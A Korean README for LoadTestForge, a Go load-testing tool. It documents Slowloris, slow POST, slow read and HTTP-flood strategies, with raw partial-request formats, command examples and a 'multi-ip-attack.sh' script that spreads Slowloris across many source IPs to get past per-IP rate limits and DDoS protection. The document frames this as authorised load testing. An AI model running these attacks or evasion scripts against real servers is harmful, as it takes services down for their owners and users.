# LoadTestForge

Slowloris 공격 지원 및 고급 메트릭을 갖춘 고성능 부하 테스트 도구

[English](README.md) | **한국어**

## 기능

- **다양한 공격 전략**
  - 일반 HTTP 부하 테스트
  - Keep-Alive HTTP (연결 재사용)
  - Classic Slowloris (불완전한 헤더, DDoS 방어 우회)
  - Keep-Alive Slowloris (완전한 헤더, 안전한 테스트)
  - Slow POST (RUDY - 큰 Content-Length, 느린 바디 전송)
  - Slow Read (느린 응답 소비, TCP 윈도우 조작)
  - HTTP Flood (대량 요청 플러딩)
  - HTTPS/TLS 지원 및 인증서 검증

- **정밀한 속도 제어**
  - Token bucket 알고리즘으로 정확한 속도 제한
  - 점진적 부하 증가를 위한 Ramp-up 지원
  - 목표: ±10% 표준 편차

- **고급 메트릭**
  - 실시간 통계
  - 백분위 분석 (p50, p95, p99)
  - 표준 편차 추적
  - 성공률 모니터링
  - TCP 세션 정확도 (goroutine vs 실제 소켓)
  - 연결 수명, 타임아웃, 재연결 원격 측정

- **멀티 IP 소스 바인딩**
  - 특정 네트워크 인터페이스에 아웃바운드 연결 바인딩
  - 타겟 서버의 단일 IP 속도 제한 우회
  - 여러 NIC 또는 IP 주소에 부하 분산
  - DDoS 보호 임계값 극복에 필수

- **프로덕션 준비 완료**
  - 세션 수명 제한 (최대 5분)
  - 우아한 종료
  - Context 기반 취소
  - 연결 풀링

- **Keep-Alive 세션 보장**
  - Keep-alive 루프 진입 전 완전한 HTTP/1.1 요청 전송
  - 요청된 세션과 열린 TCP 소켓 간 ±10% 편차 경고
  - 100-3000+ 동시 세션을 위한 설정 가능한 느린 ping 간격

- **AWS 배포**
  - Docker 컨테이너화
  - ECS Fargate 지원
  - CloudWatch 통합

## 빠른 시작

### 설치

```bash
# 저장소 클론
git clone https://github.com/jdw/LoadTestForge.git
cd LoadTestForge

# 빌드
go build -o loadtest ./cmd/loadtest

# 또는 make 사용
make build
```

### 기본 사용법

```bash
# 간단한 HTTP 부하 테스트
./loadtest --target http://httpbin.org/get --sessions 100 --rate 10 --duration 1m

# Ramp-up 포함
./loadtest --target http://example.com --sessions 1000 --rate 100 --rampup 30s --duration 5m

# Slowloris 시뮬레이션
./loadtest --target http://example.com --strategy slowloris --sessions 500 --rate 50

# 특정 소스 IP로 바인딩
./loadtest --target http://example.com --sessions 2000 --rate 500 --bind-ip 192.168.1.101
```

## 명령줄 옵션

| 플래그 | 기본값 | 설명 |
|------|---------|------|
| `--target` | (필수) | 타겟 URL (http:// 또는 https://) |
| `--strategy` | `keepalive` | 공격 전략 (아래 표 참조) |
| `--sessions` | `100` | 목표 동시 세션 수 |
| `--rate` | `10` | 초당 생성할 세션 수 |
| `--duration` | `0` (무한) | 테스트 지속 시간 (예: `30s`, `5m`, `1h`) |
| `--rampup` | `0` | 점진적 부하 증가를 위한 Ramp-up 지속 시간 |
| `--bind-ip` | `` | 아웃바운드 연결을 바인딩할 소스 IP 주소 |
| `--method` | `GET` | HTTP 메서드 |
| `--timeout` | `10s` | 요청 타임아웃 |
| `--keepalive` | `10s` | Keep-alive ping 간격 |
| `--content-length` | `100000` | slow-post용 Content-Length |
| `--read-size` | `1` | slow-read용 반복당 읽기 바이트 |
| `--window-size` | `64` | slow-read용 TCP 윈도우 크기 |
| `--post-size` | `1024` | http-flood용 POST 데이터 크기 |
| `--requests-per-conn` | `100` | http-flood용 연결당 요청 수 |

### 사용 가능한 전략

| 전략 | 설명 |
|----------|------|
| `normal` | 표준 HTTP 요청 |
| `keepalive` | 연결 재사용 HTTP (기본값) |
| `slowloris` | Classic Slowloris (불완전한 헤더) |
| `slowloris-keepalive` | 완전한 헤더의 Slowloris |
| `slow-post` | 느린 POST 바디 전송 |
| `slow-read` | 느린 응답 읽기 |
| `http-flood` | 대량 요청 플러딩 |

## 예제

### 1. Ramp-up을 사용한 점진적 부하 테스트

```bash
# 0에서 시작하여 2분에 걸쳐 1000 세션에 도달한 후 유지
./loadtest \
  --target https://api.example.com \
  --sessions 1000 \
  --rate 100 \
  --rampup 2m \
  --duration 10m
```

### 2. 백분위 분석을 사용한 스트레스 테스트

```bash
# 상세 메트릭을 사용한 고부하 테스트
./loadtest \
  --target http://your-site.com \
  --sessions 5000 \
  --rate 500 \
  --duration 5m
```

출력:
```
=== LoadTestForge Live Stats ===
Elapsed Time: 2m30s

Active Sessions: 5000
Total Requests:  750000
Success:         749500 (99.93%)
Failed:          500

Requests/sec:    4998.50 (σ=45.23)
Min/Max:         4920 / 5080
Percentiles:     p50=5000, p95=5050, p99=5070

Deviation:       0.90%
Status:          ✓ Within target (±10%)
```

### 3. HTTPS Slowloris 테스트

```bash
# TLS 핸드셰이크 및 랜덤 User-Agent를 사용한 HTTPS
./loadtest \
  --target https://secure-site.com \
  --strategy slowloris \
  --sessions 1000 \
  --rate 200 \
  --keepalive 15s
```

### 4. 내부 호스트 Slowloris 예제

```bash
# 내부 HTTP 서비스에 대한 600개 동시 세션의 Slowloris 공격
./loadtest \
  --target http://192.168.0.100 \
  --sessions 600 \
  --strategy slowloris
```

LAN 타겟에서 Slowloris 전략을 확인하는 가장 빠른 방법입니다. 실험 환경 조건에 맞게
`--bind-ip <local-ip>`를 추가하거나 `--rate`/`--keepalive`를 조정할 수 있지만,
핵심은 유효한 HTTP URL과 함께 `--strategy slowloris`를 설정하는 것입니다.

### 5. 스파이크 테스트

```bash
# 10000 세션으로 즉시 스파이크
./loadtest \
  --target http://cdn.example.com \
  --sessions 10000 \
  --rate 2000 \
  --duration 30s
```

### 6. 멀티 IP 부하 분산

```bash
# 단일 IP (타겟 DDoS 보호로 인해 ~2,400 세션으로 제한됨)
./loadtest \
  --target http://example.com \
  --sessions 2000 \
  --rate 500

# 속도 제한을 우회하기 위해 특정 NIC에 바인딩
./loadtest \
  --target http://example.com \
  --sessions 2000 \
  --rate 500 \
  --bind-ip 192.168.1.101

# 여러 IP (7개 NIC에 수동 분산 = 총 ~14,000 세션)
./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.101 &
./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.102 &
./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.103 &
./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.104 &
./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.105 &
./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.106 &
./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.107 &
```

## 성능 목표

최신 시스템 (4 CPU 코어, 8GB RAM) 기준:

| 세션 | 속도 | 메모리 | CPU | Ramp-up 시간 |
|------|------|--------|-----|--------------|
| 100 | 10/s | ~20MB | <5% | N/A |
| 1,000 | 100/s | ~100MB | 15-25% | 10s |
| 5,000 | 500/s | ~300MB | 40-60% | 30s |
| 10,000 | 1000/s | ~600MB | 80-100% | 1m |

### 단일 IP 제한

대부분의 타겟 서버는 IP당 연결 제한으로 DDoS 보호를 구현합니다:

| 시나리오 | 단일 IP | 멀티 IP (7 NIC) |
|---------|---------|-----------------|
| 타겟이 IP당 2,400개 허용 | 2,400 세션 | ~16,800 세션 |
| 타겟이 IP당 5,000개 허용 | 5,000 세션 | ~35,000 세션 |

## 공격 전략 설명

LoadTestForge는 다양한 테스트 시나리오에 최적화된 여러 공격 전략을 제공합니다:

### 1. Normal HTTP (`--strategy normal`)

**목적:** 표준 HTTP 부하 테스트

**작동 방식:**
- 완전한 HTTP 요청 전송
- 응답 대기
- 각 요청 후 연결 종료
- 연결 재사용 없음

**사용 사례:** 서버 처리량 및 요청 처리 테스트

**예제:**
```bash
./loadtest --target http://api.example.com --sessions 1000 --rate 100 --strategy normal
```

### 2. Keep-Alive HTTP (`--strategy keepalive`, 기본값)

**목적:** 현실적인 브라우저와 유사한 부하 테스트

**작동 방식:**
- 완전한 HTTP 요청 전송
- TCP 연결 재사용 (HTTP/1.1 keep-alive)
- 연결당 여러 요청
- 지속적인 부하에 효율적

**사용 사례:** 실제 사용자 트래픽 패턴 시뮬레이션

**예제:**
```bash
./loadtest --target http://api.example.com --sessions 1000 --rate 100 --strategy keepalive
```

### 3. Classic Slowloris (`--strategy slowloris`)

**목적:** DDoS 시뮬레이션 및 방어 테스트

**작동 방식:**
- **불완전한** HTTP 헤더 전송 (`\r\n\r\n` 없음)
- 요청을 완료하지 않음
- 타겟 서버가 무한정 대기
- 연결을 유지하기 위해 주기적으로 더미 헤더 전송
- **200 OK 응답 없음** (서버가 계속 대기)

**기술적 세부사항:**
```
서버로 전송:
GET /?123 HTTP/1.1\r\n
User-Agent: Mozilla/5.0...\r\n
Accept-language: en-US,en,q=0.5\r\n
(여기서 멈춤, \r\n\r\n 없음)

그 다음 10초마다:
X-a: 4567\r\n
X-a: 8901\r\n
...
```

**사용 사례:**
- DDoS 보호 메커니즘 테스트
- 연결 타임아웃 정책 검증
- 연결 풀 스트레스 테스트
- **단순 속도 제한기 우회**

**경고:** 더 공격적이며 보안 경고를 트리거할 수 있음

**예제:**
```bash
./loadtest \
  --target http://192.168.0.100 \
  --sessions 2400 \
  --rate 600 \
  --strategy slowloris
```

### 4. Keep-Alive Slowloris (`--strategy slowloris-keepalive` 또는 `keepsloworis`)

**목적:** 더 안전한 Slowloris 변형 테스트

**작동 방식:**
- **완전한** HTTP 헤더 전송
- 타겟이 200 OK로 응답
- 주기적인 헤더로 연결 유지
- DDoS 보호에 의해 더 쉽게 감지됨

**기술적 세부사항:**
```
서버로 전송:
GET / HTTP/1.1\r\n
Host: example.com\r\n
User-Agent: Mozilla/5.0...\r\n
Connection: keep-alive\r\n
\r\n
(완전한 요청)

서버 응답:
HTTP/1.1 200 OK\r\n
...

그 다음 keep-alive 헤더:
X-Keep-Alive-12345: ...\r\n
```

**사용 사례:**
- Keep-alive 타임아웃 정책 테스트
- 연결 정리 검증
- Classic Slowloris가 차단을 트리거할 때 더 안전한 대안

**예제:**
```bash
./loadtest \
  --target http://example.com \
  --sessions 600 \
  --rate 100 \
  --strategy slowloris-keepalive
```

### 전략 비교

| 기능 | Normal | Keep-Alive | Classic Slowloris | Keep-Alive Slowloris |
|------|--------|------------|-------------------|----------------------|
| **요청 완료** | ✓ | ✓ | ✗ | ✓ |
| **서버 응답** | ✓ | ✓ | ✗ | ✓ |
| **연결 재사용** | ✗ | ✓ | ✓ | ✓ |
| **DDoS 유사** | ✗ | ✗ | ✓ | 부분적 |
| **감지 위험** | 낮음 | 낮음 | 높음 | 중간 |
| **성능** | 중간 | 높음 | 최고 | 높음 |
| **IP당 최대 세션** | 2000 | 2000 | 2400+ | 600 |

### 각 전략을 사용하는 경우

**Normal 사용:**
- 순수 요청 처리량 테스트
- 비브라우저 클라이언트 시뮬레이션
- 연결 설정 오버헤드 테스트

**Keep-Alive 사용:**
- 실제 브라우저 트래픽 시뮬레이션
- 지속적인 부하 테스트
- 일반 부하 테스트 (기본 선택)

**Classic Slowloris 사용:**
- DDoS 보호 시스템 테스트
- IP 기반 속도 제한 우회 필요
- 연결 풀 스트레스 테스트
- IP당 최대 세션 수 필요

**Keep-Alive Slowloris 사용:**
- Keep-alive 타임아웃 정책 테스트
- 더 안전한 Slowloris 대안 필요
- Classic Slowloris가 IP 차단을 트리거하는 경우

## 메트릭 이해

### 백분위수 (p50, p95, p99)

- **p50 (중앙값)**: 샘플링된 초의 50%가 이 처리량 이하
- **p95**: 샘플링된 초의 95%가 이 처리량 이하 (일반적인 SLA)
- **p99**: 샘플링된 초의 99%가 이 처리량 이하 (테일 레이턴시)

> **참고:** `Requests/sec`, 표준 편차, 백분위수 계산은 성공한 요청만을 기반으로 합니다. 
> 실패한 시도는 여전히 성공/실패 총계에 계산되지만 이러한 메트릭을 제공하는 
> 초당 처리량 창에서는 제외됩니다.

### 백분위수가 중요한 이유

평균은 오해의 소지가 있을 수 있습니다. 예시:

```
평균: 100 req/s
p50: 98 req/s
p95: 150 req/s  ← 5%의 초가 이 스파이크를 가짐
p99: 200 req/s  ← 드물지만 중요한 이상값
```

### 세션 정확도 및 연결 상태

- **Active Goroutines**: `--sessions`를 통해 요청된 논리적 세션 수
- **TCP Connections**: 완전한 HTTP/1.1 핸드셰이크 후 유지되는 실제 소켓
- **Session Accuracy**: `(TCP Connections / Active Goroutines) * 100`. 
  ±10% 이상 편차가 발생하면 경고가 트리거되어 소켓이 요청된 동시성에 뒤처지는 시점을 알 수 있습니다.
- **Active Conns (tracked)**: 현재 keep-alive ping을 교환하는 소켓; 멈춘 세션 격리에 도움
- **Socket Timeouts / Reconnects**: keep-alive 쓰기 또는 읽기가 기한을 놓칠 때 증가
- **Avg/Min/Max Conn Lifetime**: 각 세션이 얼마나 오래 유지되었는지 측정 (설계상 최대 5분)

> 빠른 검증 (100세션 이하 확인):
> ```bash
> ./loadtest --target http://httpbin.org/get --sessions 50 --rate 50 --duration 30s
> ```
> TCP Connections 값이 45~55 범위(±10%)를 유지하면 Keep-Alive 기반 세션 유지가 
> 정상적으로 이루어지고 있음을 의미합니다.

## 멀티 IP 소스 바인딩

### 여러 소스 IP를 사용하는 이유

타겟 서버는 일반적으로 DDoS 보호로 IP당 속도 제한을 구현합니다:

```
단일 IP:     2,400 세션 최대 (속도 제한됨)
7 IP (NIC):  16,800 세션 (2,400 × 7)
100 IP:      240,000 세션 (2,400 × 100)
```

### 멀티 IP가 필요한 경우

**IP 기반 속도 제한의 증상:**
- 더 높은 `--sessions` 설정에도 불구하고 세션이 ~2,000-3,000에서 정체됨
- `netstat`이 높은 연결 리셋(RST 패킷)을 보여줌
- 타겟 서버 로그에 "rate limit exceeded" 또는 "too many connections" 표시

**예시:**
```bash
# 설정: 5,000 세션
./loadtest --target http://example.com --sessions 5000 --rate 500

# 실제: 2,400 세션만 설정됨
# netstat 표시: 113,195 연결 리셋

# 해결책: 여러 소스 IP 사용
```

### bind-ip 사용 방법

**1. 사용 가능한 네트워크 인터페이스 확인:**

```bash
# Linux/Mac
ip addr show

# 예상 출력:
# eth0: 192.168.1.101
# eth1: 192.168.1.102
# eth2: 192.168.1.103
# ...
```

**2. 단일 IP 바인딩:**

```bash
./loadtest \
  --target http://example.com \
  --sessions 2000 \
  --rate 500 \
  --bind-ip 192.168.1.101
```

**3. 멀티 IP 수동 분산:**

```bash
# 각 NIC에 대해 별도 프로세스 실행
./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.101 &
./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.102 &
./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.103 &
./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.104 &
./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.105 &
./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.106 &
./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.107 &

# 모든 프로세스 모니터링
watch -n 1 'ps aux | grep loadtest | wc -l'
```

**4. 자동화된 멀티 IP 스크립트:**

```bash
#!/bin/bash
# multi-ip-attack.sh

TARGET="http://example.com"
SESSIONS=2000
RATE=500
STRATEGY="slowloris"

# 사용 가능한 모든 IP 자동 감지
IPS=$(ip addr show | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d'/' -f1)

echo "감지된 IP:"
echo "$IPS"
echo ""

# IP당 하나의 프로세스 실행
for ip in $IPS; do
    echo "IP로 시작: $ip"
    ./loadtest \
        --target "$TARGET" \
        --sessions "$SESSIONS" \
        --rate "$RATE" \
        --strategy "$STRATEGY" \
        --bind-ip "$ip" &
    sleep 1
done

echo "모든 프로세스가 실행되었습니다. 중지하려면 Ctrl+C를 누르세요."
wait
```

### 검증

```bash
# 어떤 IP가 사용되고 있는지 확인
netstat -an | grep ESTABLISHED | awk '{print $4}' | cut -d':' -f1 | sort | uniq -c

# 7개 IP의 예상 출력:
#   342 192.168.1.101
#   341 192.168.1.102
#   339 192.168.1.103
#   344 192.168.1.104
#   338 192.168.1.105
#   342 192.168.1.106
#   341 192.168.1.107

# 총: 7개 IP에 걸쳐 ~2,387 세션
```

### 중요 참고사항

**IP 바인딩 vs IP 스푸핑:**
- `--bind-ip`는 **실제 할당된 IP 주소** 사용 (합법적)
- IP 스푸핑은 **가짜 IP** 사용 (불법, 즉시 감지됨)
- 항상 실제 네트워크 인터페이스와 함께 bind-ip 사용

**IP당 세션 제한:**
- 대부분의 서버: IP당 2,000-3,000 세션
- 고보안 서버: IP당 500-1,000 세션
- CDN: IP당 5,000-10,000 세션

**성능 영향:**
- 바인딩 오버헤드: <1% CPU
- 의미 있는 성능 저하 없음
- 병목은 네트워크 대역폭이지 IP 바인딩이 아님

## 모범 사례

### 1. 대규모 테스트에는 항상 Ramp-up 사용

```bash
# 나쁨: 즉시 스파이크는 타겟을 충돌시킬 수 있음
./loadtest --target http://api.com --sessions 10000 --rate 2000

# 좋음: 점진적 증가
./loadtest --target http://api.com --sessions 10000 --rate 2000 --rampup 2m
```

### 2. 평균이 아닌 백분위수 모니터링

```
p99 >> 평균이면 다음이 있습니다:
- 네트워크 혼잡
- 간헐적인 서버 과부하
- 리소스 경합
```

### 3. 작게 시작하여 확장

```bash
# 1단계: 기준선
./loadtest --target http://api.com --sessions 10 --rate 1 --duration 1m

# 2단계: 증가
./loadtest --target http://api.com --sessions 100 --rate 10 --duration 2m

# 3단계: 확장
./loadtest --target http://api.com --sessions 1000 --rate 100 --rampup 30s --duration 5m
```

### 4. 타겟 모니터링과 결합

LoadTestForge를 실행하는 동안 타겟을 모니터링하세요:
- CPU/메모리 사용량
- 응답 시간
- 오류율
- 데이터베이스 연결
- 네트워크 대역폭

### 5. 높은 세션 수에는 멀티 IP 사용

```bash
# 단일 IP가 2,400 세션에서 정체되는 경우
./loadtest --target http://api.com --sessions 5000 --rate 500
# 실제: 2,400 세션 (IP 속도 제한됨)

# 해결책: 여러 IP에 분산
for i in {1..7}; do
    ./loadtest --target http://api.com --sessions 2000 --bind-ip 192.168.1.10$i &
done
# 실제: 14,000 세션 (2,000 × 7)
```

## 문제 해결

### 높은 p99 값

**문제:** `p99 >> p50`는 테일 레이턴시 문제를 나타냅니다.

**해결책:**
- 타겟 서버 리소스 확인
- 부하 감소 (`--rate`)
- 타임아웃 증가 (`--timeout 30s`)

### "Too many open files"

**해결책:**
```bash
# Linux/Mac
ulimit -n 65536

# Docker
docker-compose.yml에 추가:
ulimits:
  nofile:
    soft: 65536
    hard: 65536
```

### 타겟 이하로 세션 정체

**문제:** 단일 IP에서 2,000-3,000 세션을 초과할 수 없음.

**진단:**
```bash
netstat -s | grep -i reset
# 높은 리셋 횟수 = IP 속도 제한
```

**해결책:**
```bash
# 여러 소스 IP 사용
./loadtest --bind-ip 192.168.1.101 --sessions 2000 &
./loadtest --bind-ip 192.168.1.102 --sessions 2000 &
# ...
```

### 잘못된 bind IP 오류

**문제:** `Error: invalid bind IP: 192.168.1.999`

**해결책:**
```bash
# IP가 네트워크 인터페이스에 할당되었는지 확인
ip addr show | grep 192.168.1

# 출력에 나타나는 IP만 사용
```

## 라이선스

MIT License

## 법적 고지

이 도구는 승인된 부하 테스트 전용입니다. 소유하지 않았거나 테스트 권한이 없는 시스템에 대한 
무단 사용은 불법입니다.

항상:
- 서면 허가 받기
- 이해관계자에게 알리기
- 현지 법률 이해하기
- 스테이징에서 먼저 테스트

## 기여

풀 리퀘스트를 환영합니다! 다음 사항을 준수해주세요:
1. 새 기능에 대한 테스트 추가
2. 문서 업데이트
3. 기존 코드 스타일 따르기
4. 커밋 전에 `make fmt` 실행
